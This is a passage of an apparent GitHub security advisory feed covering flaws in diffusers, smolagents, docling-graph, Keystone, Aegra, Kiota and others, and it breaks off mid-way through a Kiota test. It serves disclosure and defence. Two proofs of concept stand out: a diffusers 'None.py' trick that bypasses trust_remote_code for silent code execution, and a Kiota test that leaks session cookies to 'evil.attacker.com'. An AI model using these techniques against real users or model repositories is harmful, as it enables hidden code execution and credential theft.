<li><strong>Release notes:</strong> <a href="https://github.com/huggingface/diffusers/releases/tag/v0.38.0">https://github.com/huggingface/diffusers/releases/tag/v0.38.0</a></li>
<li><strong>CWE-94:</strong> <a href="https://cwe.mitre.org/data/definitions/94.html">https://cwe.mitre.org/data/definitions/94.html</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/huggingface/diffusers/security/advisories/GHSA-98h9-4798-4q5v">https://github.com/huggingface/diffusers/security/advisories/GHSA-98h9-4798-4q5v</a></li>
<li><a href="https://github.com/huggingface/diffusers/issues/13446">https://github.com/huggingface/diffusers/issues/13446</a></li>
<li><a href="https://github.com/huggingface/diffusers/pull/13448">https://github.com/huggingface/diffusers/pull/13448</a></li>
<li><a href="https://github.com/huggingface/diffusers/commit/a37f6f8394ac2a7ee8360c3abea811efe54512b1">https://github.com/huggingface/diffusers/commit/a37f6f8394ac2a7ee8360c3abea811efe54512b1</a></li>
<li><a href="https://github.com/huggingface/diffusers/releases/tag/v0.38.0">https://github.com/huggingface/diffusers/releases/tag/v0.38.0</a></li>
<li><a href="https://github.com/advisories/GHSA-98h9-4798-4q5v">https://github.com/advisories/GHSA-98h9-4798-4q5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-98h9-4798-4q5v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T05:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[smolagents] Hugging Face Smolagents has a Server-Side Request Forgery issue]]></title>
        <id>https://github.com/advisories/GHSA-jxgv-6j54-wwc7</id>
        <link href="https://github.com/advisories/GHSA-jxgv-6j54-wwc7"/>
        <updated>2026-05-07T05:25:09.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in huggingface smolagents 1.24.0. Impacted is the function requests.get/requests.post of the component LocalPythonExecutor. Executing a manipulation can lead to server-side request forgery. It is possible to launch the attack remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-2654">https://nvd.nist.gov/vuln/detail/CVE-2026-2654</a></li>
<li><a href="https://github.com/CH0ico/CVE_choco_smolagent/blob/main/report.md#proof-of-concept-execution">https://github.com/CH0ico/CVE_choco_smolagent/blob/main/report.md#proof-of-concept-execution</a></li>
<li><a href="https://github.com/CH0ico/CVE_choco_smolagent/tree/main">https://github.com/CH0ico/CVE_choco_smolagent/tree/main</a></li>
<li><a href="https://vuldb.com/?ctiid.346451">https://vuldb.com/?ctiid.346451</a></li>
<li><a href="https://vuldb.com/?id.346451">https://vuldb.com/?id.346451</a></li>
<li><a href="https://vuldb.com/?submit.752774">https://vuldb.com/?submit.752774</a></li>
<li><a href="https://github.com/advisories/GHSA-jxgv-6j54-wwc7">https://github.com/advisories/GHSA-jxgv-6j54-wwc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jxgv-6j54-wwc7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-02-18T15:31:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[docling-graph] docling-graph has SSRF via Missing Internal IP Validation in URLInputHandler]]></title>
        <id>https://github.com/advisories/GHSA-fqph-j6v6-jvgx</id>
        <link href="https://github.com/advisories/GHSA-fqph-j6v6-jvgx"/>
        <updated>2026-05-07T03:15:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>URLInputHandler</code> class in <code>docling_graph/core/input/handlers.py</code> makes HTTP requests to user-supplied URLs without validating whether the target resolves to a private, loopback, or link-local IP address. The <code>URLValidator</code> only checks for a valid scheme and non-empty <code>netloc</code>, performing no IP-level validation. Additionally, <code>requests.head()</code> was called with <code>allow_redirects=True</code>, allowing an attacker to redirect requests to internal endpoints via an intermediary URL.</p>
<p>An attacker who can control the <code>--source</code> CLI argument or <code>PipelineConfig.source</code> API parameter can trigger Server-Side Request Forgery (SSRF) to reach:</p>
<ul>
<li>Cloud metadata endpoints (e.g. <code>169.254.169.254</code>) to steal IAM credentials</li>
<li>Internal services on loopback (<code>127.0.0.1</code>) or private network ranges (<code>10.x</code>, <code>172.16.x</code>, <code>192.168.x</code>)</li>
</ul>
<p>This affects deployments where <code>docling-graph</code> processes URLs from untrusted input, such as multi-tenant pipelines or server-side automation.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability is fixed in <strong>v1.5.1</strong>.</p>
<p>Users should upgrade immediately:</p>
<pre><code>pip install --upgrade docling-graph
</code></pre>
<p>The fix adds IP validation via <code>ipaddress</code> and <code>socket.gethostbyname()</code> before any request is made, blocks private/loopback/link-local/reserved addresses, and disables redirect following (<code>allow_redirects=False</code>) with explicit validation of any <code>Location</code> header before following it.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible, ensure that <strong>all URLs passed to <code>URLInputHandler</code> come exclusively from trusted, internal sources</strong>, never from user-supplied or external input. There is no safe code-level workaround short of applying the patch, as the vulnerability is in the library itself.</p>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
<li><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS Instance Metadata endpoint</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/docling-project/docling-graph/security/advisories/GHSA-fqph-j6v6-jvgx">https://github.com/docling-project/docling-graph/security/advisories/GHSA-fqph-j6v6-jvgx</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html</a></li>
<li><a href="https://github.com/advisories/GHSA-fqph-j6v6-jvgx">https://github.com/advisories/GHSA-fqph-j6v6-jvgx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqph-j6v6-jvgx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T03:15:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[AstrBot] AstrBot Makes Use of Hard-coded Password]]></title>
        <id>https://github.com/advisories/GHSA-mq9q-25hm-g4gp</id>
        <link href="https://github.com/advisories/GHSA-mq9q-25hm-g4gp"/>
        <updated>2026-05-07T02:55:42.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in AstrBotDevs AstrBot up to 4.16.0. This issue affects some unknown processing of the file astrbot/dashboard/routes/auth.py of the component Dashboard. The manipulation leads to hard-coded credentials. It is possible to initiate the attack remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AstrBotDevs/AstrBot/security/advisories/GHSA-vrqm-xcfv-286r">https://github.com/AstrBotDevs/AstrBot/security/advisories/GHSA-vrqm-xcfv-286r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-7579">https://nvd.nist.gov/vuln/detail/CVE-2026-7579</a></li>
<li><a href="https://github.com/AstrBotDevs/AstrBot">https://github.com/AstrBotDevs/AstrBot</a></li>
<li><a href="https://github.com/Dave-gilmore-aus/security-advisories/blob/main/AstrBot-Security-Advisory">https://github.com/Dave-gilmore-aus/security-advisories/blob/main/AstrBot-Security-Advisory</a></li>
<li><a href="https://vuldb.com/submit/793437">https://vuldb.com/submit/793437</a></li>
<li><a href="https://vuldb.com/vuln/360420">https://vuldb.com/vuln/360420</a></li>
<li><a href="https://vuldb.com/vuln/360420/cti">https://vuldb.com/vuln/360420/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-mq9q-25hm-g4gp">https://github.com/advisories/GHSA-mq9q-25hm-g4gp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mq9q-25hm-g4gp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-01T12:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization Issue]]></title>
        <id>https://github.com/advisories/GHSA-hhq2-3832-xxcv</id>
        <link href="https://github.com/advisories/GHSA-hhq2-3832-xxcv"/>
        <updated>2026-05-07T02:40:03.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone 13 through 29. POST /v3/credentials did not validate that the caller-supplied project_id for an EC2-type credential matched the project of the authenticating application credential. This allowed an attacker holding an unrestricted application credential for project A to create an EC2 credential targeting project B; a subsequent /v3/ec2tokens exchange would then issue a Keystone token scoped to project B while still carrying the original app_cred_id, enabling cross-project lateral movement within the credential owner's role footprint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43001">https://nvd.nist.gov/vuln/detail/CVE-2026-43001</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2149775">https://bugs.launchpad.net/keystone/+bug/2149775</a></li>
<li><a href="https://review.opendev.org/c/openstack/keystone/+/985804">https://review.opendev.org/c/openstack/keystone/+/985804</a></li>
<li><a href="https://github.com/advisories/GHSA-hhq2-3832-xxcv">https://github.com/advisories/GHSA-hhq2-3832-xxcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhq2-3832-xxcv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-01T09:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ironic-python-agent] OpenStack Ironic Python Agent Includes Functionality from Untrusted Control Sphere]]></title>
        <id>https://github.com/advisories/GHSA-rmxr-45gj-889w</id>
        <link href="https://github.com/advisories/GHSA-rmxr-45gj-889w"/>
        <updated>2026-05-07T02:38:58.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack ironic-python-agent 1.0.0 through 11.5.0. Ironic Python Agent (IPA) sometimes executes grub-install from within a chroot of the deployed partition image, leading to code execution in the case of a malicious image.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43003">https://nvd.nist.gov/vuln/detail/CVE-2026-43003</a></li>
<li><a href="https://bugs.launchpad.net/ironic-python-agent/+bug/2148310">https://bugs.launchpad.net/ironic-python-agent/+bug/2148310</a></li>
<li><a href="https://github.com/openstack/ironic-python-agent/blob/236b33abffe6688afc39c21e351cc3889b3db2dd/ironic_python_agent/efi_utils.py#L134-L139">https://github.com/openstack/ironic-python-agent/blob/236b33abffe6688afc39c21e351cc3889b3db2dd/ironic_python_agent/efi_utils.py#L134-L139</a></li>
<li><a href="https://github.com/advisories/GHSA-rmxr-45gj-889w">https://github.com/advisories/GHSA-rmxr-45gj-889w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rmxr-45gj-889w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-01T09:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diffusers] Duplicate Advisory: Diffusers has a `trust_remote_code` bypass via `custom_pipeline` and local custom components]]></title>
        <id>https://github.com/advisories/GHSA-j7w6-vpvq-j3gm</id>
        <link href="https://github.com/advisories/GHSA-j7w6-vpvq-j3gm"/>
        <updated>2026-05-07T05:25:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-98h9-4798-4q5v. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<h2 id="background">Background</h2>
<p>This vulnerability is found in the <code>DiffusionPipeline.from_pretrained</code> flow, which is used to load a pipeline from the HuggingFace Hub.</p>
<p>This function accepts an optional <code>custom_pipeline</code> keyword argument: the name of a Python file in the repo that contains a custom class inheriting from <code>DiffusionPipeline</code>. An equivalent flow is triggered when the <code>_class_name</code> field in <code>model_index.json</code> (the repo config file) is set to a custom class.</p>
<p>Any attempt to use a custom pipeline throws the following exception, requesting that <code>trust_remote_code</code> is also passed:</p>
<pre><code class="language-python">DiffusionPipeline.from_pretrained(
    pretrained_model_name_or_path='ido-shani/custom-pipeline',
    custom_pipeline="custom"
)

ValueError: The repository for ido-shani/custom-pipeline contains custom code in
custom.py which must be executed to correctly load the model. You can inspect the
repository content at https://hf.co/ido-shani/custom-pipeline/blob/main/custom.py.
Please pass the argument `trust_remote_code=True` to allow custom code to be run.
</code></pre>
<p>The vulnerability is a silent RCE - it allows arbitrary code to be loaded through the custom_pipeline flow from a Hub repo, with no <code>custom_pipeline</code> or <code>trust_remote_code</code> kwargs and nothing suspicious in the config. The <code>from_pretrained</code> call succeeds and returns a functional pipeline.</p>
<h2 id="naive-flow">Naive Flow</h2>
<p>First, all relevant arguments are popped from kwargs and stored in local variables.</p>
<p>Given a <code>pretrained_model_name_or_path</code> that is a Hub repo ID, <code>DiffusionPipeline.download()</code> is called. This function serves two roles: it orchestrates downloading relevant model files, and it is the security gatekeeper for <code>trust_remote_code</code>. It is called even if the model is already cached; in that case it exits early. If the repo contains custom code, it checks whether <code>trust_remote_code</code> was passed and raises otherwise:</p>
<pre><code class="language-python"># pipeline_utils.py:1645-1652
load_pipe_from_hub = custom_pipeline is not None and f"{custom_pipeline}.py" in filenames

...

if load_pipe_from_hub and not trust_remote_code:
    raise ValueError(...)
</code></pre>
<p>It then runs <code>_get_pipeline_class</code>, which returns the class object of the pipeline in order to inspect its <code>__init__</code> signature and determine which component files need to be downloaded. As part of building the <code>allow_patterns</code> list used to filter the snapshot download to necessary files only, the custom pipeline file is explicitly included if present:</p>
<pre><code class="language-python"># pipeline_utils.py:1707
allow_patterns += [f"{custom_pipeline}.py"] if f"{custom_pipeline}.py" in filenames else []
</code></pre>
<p>The function then checks if all expected files are already present, and either exits early or triggers a snapshot download with those patterns.</p>
<p>The next step in <code>from_pretrained</code> is loading the pipeline class a second time, this time to actually instantiate it. Before calling <code>_get_pipeline_class</code> again, <code>_resolve_custom_pipeline_and_cls</code> is called to translate the <code>custom_pipeline</code> name into a local path, since the files have already been downloaded:</p>
<pre><code class="language-python"># pipeline_loading_utils.py:965-974
def _resolve_custom_pipeline_and_cls(folder, config, custom_pipeline):
    custom_class_name = None
    if os.path.isfile(os.path.join(folder, f"{custom_pipeline}.py")):
        custom_pipeline = os.path.join(folder, f"{custom_pipeline}.py")
    elif isinstance(config["_class_name"], (list, tuple)) and os.path.isfile(
        os.path.join(folder, f"{config['_class_name'][0]}.py")
    ):
        custom_pipeline = os.path.join(folder, f"{config['_class_name'][0]}.py")
        custom_class_name = config["_class_name"][1]

    return custom_pipeline, custom_class_name
</code></pre>
<p>When <code>custom_class_name</code> is <code>None</code> (i.e. <code>custom_pipeline</code> was given as a kwarg rather than via the config), <code>_get_pipeline_class</code> will scan the file and automatically identify the class that subclasses <code>DiffusionPipeline</code>.</p>
<p>Once this is done, <code>_get_pipeline_class</code> is invoked with the resolved local path, which loads the custom code, retrieves the class object, and proceeds with instantiation.</p>
<h2 id="the-vulnerability">The Vulnerability</h2>
<p><code>_resolve_custom_pipeline_and_cls</code> receives <code>custom_pipeline</code> from the kwargs - when not supplied it defaults to <code>None</code>. That <code>None</code> is used in string formatting: <code>f"{None}.py"</code> = <code>"None.py"</code>.</p>
<p><strong>If the repo contains a file with this name, it will be detected as a custom pipeline.</strong></p>
<p>This is only reached on the second invocation of <code>_get_pipeline_class</code> (inside <code>from_pretrained</code>, after <code>download()</code> returns). The trust_remote_code check lives entirely in <code>download()</code>, which evaluated <code>custom_pipeline is None -&gt; False</code> and skipped it. By the time <code>_resolve_custom_pipeline_and_cls</code> runs, it is no longer relevant.</p>
<p>As a bonus, <code>None.py</code> even gets downloaded automatically when the model isn't cached yet. This isn't strictly required - it is quite plausible that the victim has already run <code>hf download &lt;model&gt;</code> and has all files locally - but if they haven't, revisiting the <code>allow_patterns</code> line above shows it makes the same error: <code>f"{None}.py"</code> = <code>"None.py"</code> is added to <code>allow_patterns</code> and fetched.</p>
<p>What should <code>None.py</code> contain? To avoid breaking the pipeline load, it must define a class inheriting from <code>DiffusionPipeline</code>. To avoid leaving suspicious clues in the config, that class should shadow one that already exists in diffusers. The following satisfies both requirements:</p>
<pre><code class="language-python">from diffusers import FluxPipeline as _FluxPipeline

class FluxPipeline(_FluxPipeline):
    pass

# INSERT MALICIOUS CODE HERE
import pathlib
pathlib.Path("/tmp/pwned").write_text(":)")
</code></pre>
<p>With this, <code>model_index.json</code> can contain <code>"_class_name": "FluxPipeline"</code> - appearing to use the standard diffusers class - and the resulting pipeline is fully functional (it is also functional when running as a local directory). This has been verified against an extracted version of <a href="https://huggingface.co/DDUF/tiny-flux-dev-pipe-dduf">DDUF/tiny-flux-dev-pipe-dduf</a>.</p>
<p>All the attacker needs the victim to run is:</p>
<pre><code class="language-python">from diffusers import DiffusionPipeline

pipeline = DiffusionPipeline.from_pretrained('ido-shani/none-py-trust-remote-code-bypass')
</code></pre>
<h2 id="poc">PoC</h2>
<ul>
<li>Upload this zip as a model to the hub. <a href="https://drive.google.com/file/d/1mULARMLJJUTCi57xIv0wtDauko-JW0h7/view?usp=sharing">https://drive.google.com/file/d/1mULARMLJJUTCi57xIv0wtDauko-JW0h7/view?usp=sharing</a></li>
<li>Run <code>DiffusionPipeline.from_pretrained</code> on the uploaded model hub identifier.</li>
<li>RCE occured; <code>/tmp/pwned</code> was created. If users are running the exploit on windows, they should change the path touched in <code>None.py</code>.</li>
</ul>
<h1 id="impact">Impact</h1>
<p>The vulnerability is a silent RCE - it allows arbitrary code to be loaded through the custom_pipeline flow from a Hub repo, with no <code>custom_pipeline</code> or <code>trust_remote_code</code> kwargs and nothing suspicious in the config. The <code>from_pretrained</code> call succeeds and returns a functional pipeline.</p>
<h1 id="occurrences">Occurrences</h1>
<p><a href="https://github.com/huggingface/diffusers/blob/e1b5db52bda85d47a4f8f75954f77e672a8f7f1c/src/diffusers/pipelines/pipeline_loading_utils.py#L976">https://github.com/huggingface/diffusers/blob/e1b5db52bda85d47a4f8f75954f77e672a8f7f1c/src/diffusers/pipelines/pipeline_loading_utils.py#L976</a></p>
<h1 id="patches">Patches</h1>
<p>Yes. Fixed in <strong>diffusers 0.38.0</strong> via <a href="https://github.com/huggingface/diffusers/pull/13448">PR #13448</a>. All users on versions <code>&lt; 0.38.0</code> should upgrade:</p>
<pre><code class="language-bash">pip install --upgrade "diffusers&gt;=0.38.0"
</code></pre>
<p>The fix moves the <code>trust_remote_code</code> gate out of <code>DiffusionPipeline.download()</code> and into <code>get_cached_module_file</code> in <code>src/diffusers/utils/dynamic_modules_utils.py</code>, which is the actual chokepoint for every dynamic module load (local, Hub, or community mirror). All three variants now raise <code>ValueError</code> when trust_remote_code=False instead of executing untrusted code.  </p>
<h1 id="workarounds">Workarounds</h1>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Only call <code>from_pretrained</code> with <code>pretrained_model_name_or_path</code>, <code>custom_pipeline</code>, and local snapshot directories from sources you fully trust and have audited.</li>
<li>Do not pass <code>custom_pipeline=</code> pointing at a Hub repository different from the primary <code>pretrained_model_name_or_path</code> unless you have read its <code>pipeline.py</code>.</li>
<li>Before calling <code>from_pretrained</code> on a local snapshot, inspect the snapshot for unexpected <code>*.py</code> files, especially under component subdirectories (<code>unet/</code>, <code>scheduler/</code>, etc.) and at the snapshot root.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/huggingface/diffusers/security/advisories/GHSA-j7w6-vpvq-j3gm">https://github.com/huggingface/diffusers/security/advisories/GHSA-j7w6-vpvq-j3gm</a></li>
<li><a href="https://github.com/huggingface/diffusers/pull/13448">https://github.com/huggingface/diffusers/pull/13448</a></li>
<li><a href="https://github.com/huggingface/diffusers/commit/a37f6f8394ac2a7ee8360c3abea811efe54512b1">https://github.com/huggingface/diffusers/commit/a37f6f8394ac2a7ee8360c3abea811efe54512b1</a></li>
<li><a href="https://github.com/huggingface/diffusers/releases/tag/v0.38.0">https://github.com/huggingface/diffusers/releases/tag/v0.38.0</a></li>
<li><a href="https://github.com/advisories/GHSA-j7w6-vpvq-j3gm">https://github.com/advisories/GHSA-j7w6-vpvq-j3gm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j7w6-vpvq-j3gm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T02:24:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aegra-api] Aegra has cross-user run injection in /threads/{thread_id}/runs (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-m98r-6667-4wq7</id>
        <link href="https://github.com/advisories/GHSA-m98r-6667-4wq7"/>
        <updated>2026-05-07T01:49:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>Aegra deployments running 0.9.0 through 0.9.6 with multiple authenticated users on a shared instance are vulnerable to a cross-tenant IDOR. Any authenticated user (User A), given another user's <code>thread_id</code> (User B), can:</p>
<ul>
<li>Execute graph runs against User B's thread via <code>POST /threads/{thread_id}/runs</code>, <code>POST /threads/{thread_id}/runs/stream</code>, or <code>POST /threads/{thread_id}/runs/wait</code></li>
<li>Read User B's full checkpoint state via the resulting run's <code>output</code> field</li>
<li>Inject arbitrary messages into User B's conversation history (persisted in B's checkpoint)</li>
<li>Hide their activity from User B's <code>GET /threads/{thread_id}/runs</code> listing because the run carries A's <code>user_id</code></li>
</ul>
<p>The streaming variant is worse — the first SSE <code>event: values</code> frame returns the entire prior <code>messages</code> array immediately on connection, no graph execution needed.</p>
<p>Thread IDs are UUIDs but leak through frontend URLs, server logs, observability traces, and shared links. Guessing is not required.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in <strong>0.9.7</strong>. The three affected endpoints now perform an SQL-level <code>user_id == authenticated_user.identity</code> check before calling <code>_prepare_run</code>. When the thread exists but is owned by another user, the response is <code>404 Thread not found</code> (matching the read-side pattern) to avoid leaking thread existence.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrade is not immediately possible, register an <code>@auth.on("threads", "create_run")</code> handler that explicitly verifies thread ownership against the authenticated identity before allowing the operation. Without a handler, no built-in authorization runs on these write paths.</p>
<p>Example mitigation handler:</p>
<pre><code class="language-python">from langgraph_sdk import Auth

auth = Auth()

@auth.on("threads", "create_run")
async def enforce_thread_owner(ctx: Auth.types.AuthContext, value: dict):
    # Look up the thread, raise 404 if not owned by ctx.user.identity.
    # Implementation depends on your data layer.
    ...
</code></pre>
<h2 id="root-cause">Root cause</h2>
<p>Aegra's authorization model delegates per-resource policy to user-defined <code>@auth.on</code> handlers. When no handler is registered, <code>handle_event(...)</code> returns <code>None</code> and the request proceeds (default-allow). Read endpoints in <code>api/threads.py</code> add a defense-in-depth <code>user_id</code> filter at the SQL layer, but the run-creation endpoints in <code>api/runs.py</code> skipped that filter. Result: out-of-the-box deployments without custom auth handlers were vulnerable.</p>
<h2 id="affected-endpoints">Affected endpoints</h2>
<ul>
<li><code>POST /threads/{thread_id}/runs</code></li>
<li><code>POST /threads/{thread_id}/runs/stream</code></li>
<li><code>POST /threads/{thread_id}/runs/wait</code></li>
</ul>
<p>Stateless variants (<code>POST /runs</code>, <code>POST /runs/wait</code>, <code>POST /runs/stream</code>) are NOT affected — they generate a fresh <code>thread_id</code> server-side and never accept a caller-supplied one.</p>
<h2 id="credits">Credits</h2>
<ul>
<li>@JoJoTheBizarre — discovered and reported the vulnerability with a precise reproducer (#336)</li>
<li>@victorjmarin and @jawhardjebbi — wrote the fix and added test coverage at unit, integration, and manual-auth e2e levels (#337)</li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li>Issue: <a href="https://github.com/aegra/aegra/issues/336">https://github.com/aegra/aegra/issues/336</a></li>
<li>Fix PR: <a href="https://github.com/aegra/aegra/pull/337">https://github.com/aegra/aegra/pull/337</a></li>
<li>Release: <a href="https://github.com/aegra/aegra/releases/tag/v0.9.7">https://github.com/aegra/aegra/releases/tag/v0.9.7</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aegra/aegra/security/advisories/GHSA-m98r-6667-4wq7">https://github.com/aegra/aegra/security/advisories/GHSA-m98r-6667-4wq7</a></li>
<li><a href="https://github.com/aegra/aegra/issues/336">https://github.com/aegra/aegra/issues/336</a></li>
<li><a href="https://github.com/aegra/aegra/pull/337">https://github.com/aegra/aegra/pull/337</a></li>
<li><a href="https://github.com/aegra/aegra/commit/e1b2042254fd49072ca281bc35b3f2a3bed74b31">https://github.com/aegra/aegra/commit/e1b2042254fd49072ca281bc35b3f2a3bed74b31</a></li>
<li><a href="https://github.com/aegra/aegra/releases/tag/v0.9.7">https://github.com/aegra/aegra/releases/tag/v0.9.7</a></li>
<li><a href="https://github.com/advisories/GHSA-m98r-6667-4wq7">https://github.com/advisories/GHSA-m98r-6667-4wq7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m98r-6667-4wq7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T01:49:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[microsoft-kiota-http] Kiota abstractions RedirectHandler leaks Cookie/Proxy-Authorization headers on cross-host redirect]]></title>
        <id>https://github.com/advisories/GHSA-7j59-v9qr-6fq9</id>
        <link href="https://github.com/advisories/GHSA-7j59-v9qr-6fq9"/>
        <updated>2026-05-07T01:49:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The RedirectHandler middleware in microsoft/kiota-java (com.microsoft.kiota:microsoft-kiota-http-okHttp v1.9.0) and other Kiota libraries fails to strip sensitive HTTP headers when following 3xx redirects to a different host or scheme. </p>
<p>This vulnerability is present in the RedirectHandlers for:</p>
<p><a href="https://github.com/microsoft/kiota-dotnet">https://github.com/microsoft/kiota-dotnet</a>
<a href="https://github.com/microsoft/kiota-java">https://github.com/microsoft/kiota-java</a>
<a href="https://github.com/microsoft/kiota-python">https://github.com/microsoft/kiota-python</a>
<a href="https://github.com/microsoft/kiota-typescript">https://github.com/microsoft/kiota-typescript</a>
<a href="https://github.com/microsoft/kiota-http-go">https://github.com/microsoft/kiota-http-go</a></p>
<h3 id="details">Details</h3>
<p>Only the Authorization header is removed; Cookie, Proxy-Authorization, and all custom headers are forwarded to the redirect target.</p>
<p>This is the default middleware in every kiota-java HTTP client created via KiotaClientFactory.create(). OkHttp's built-in redirect handler (which handles this correctly) is explicitly disabled at line 63 of KiotaClientFactory.java in favor of kiota's broken implementation.</p>
<p>Vulnerable code in RedirectHandler.java lines 107-116 (getRedirect method) in versions 1.90 and earlier:</p>
<pre><code>boolean sameScheme = locationUrl.scheme().equalsIgnoreCase(requestUrl.scheme());
boolean sameHost = locationUrl.host().toString().equalsIgnoreCase(requestUrl.host().toString());
if (!sameScheme || !sameHost) {
requestBuilder.removeHeader("Authorization");
// BUG: Cookie, Proxy-Authorization, and all other headers are NOT removed
}
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Clone the repository:
git clone --depth 1 <a href="https://github.com/microsoft/kiota-java.git">https://github.com/microsoft/kiota-java.git</a>
cd kiota-java</p>
</li>
<li><p>Create the PoC test file at:
components/http/okHttp/src/test/java/com/microsoft/kiota/http/middleware/SecurityPoC.java</p>
</li>
</ol>
<p>With this content:</p>
<pre><code>package com.microsoft.kiota.http.middleware;
import static org.junit.jupiter.api.Assertions.*;
import com.microsoft.kiota.http.KiotaClientFactory;
import okhttp3.*;
import okhttp3.mockwebserver.*;
import org.junit.jupiter.api.Test;

public class SecurityPoC {
@Test
void crossHostRedirectLeaksCookies() throws Exception {
Request original = new Request.Builder()
.url("http://trusted.example.com/api")
.addHeader("Authorization", "Bearer token")
.addHeader("Cookie", "session=SECRET")
.addHeader("Proxy-Authorization", "Basic cHJveHk6cGFzcw==")
.build();
Response redirect = new Response.Builder()
.request(original).protocol(Protocol.HTTP_1_1)
.code(302).message("Found")
.header("Location", "http://evil.attacker.com/steal")
.body(ResponseBody.create("", MediaType.parse("text/plain")))
.build();
Request result = new RedirectHandler().getRedirect(original, redirect);
assertNotNull(result);
assertEquals("evil.attacker.com", result.url().host());
assertNull(result.header("Authorization")); // stripped (good)
assertEquals("session=SECRET", result.header("Cookie")); // LEAKED
assertEquals("Basic cHJveHk6cGFzcw==", result.header("Proxy-Authorization")); // LEAKED
}

@Test
void endToEndProof() throws Exception {
var evil = new MockWebServer();
evil.start();
evil.enqueue(new MockResponse().setResponseCode(200));
var trusted = new MockWebServer();
trusted.start();
trusted.enqueue(new MockResponse().setResponseCode(302)
.setHeader("Location", evil.url("/steal")));
OkHttpClient client = KiotaClientFactory.create(
new Interceptor[]{new RedirectHandler()}).build();
client.newCall(new Request.Builder().url(trusted.url("/api"))
.addHeader("Cookie", "session=SECRET").build()).execute();
trusted.takeRequest();
RecordedRequest captured = evil.takeRequest();
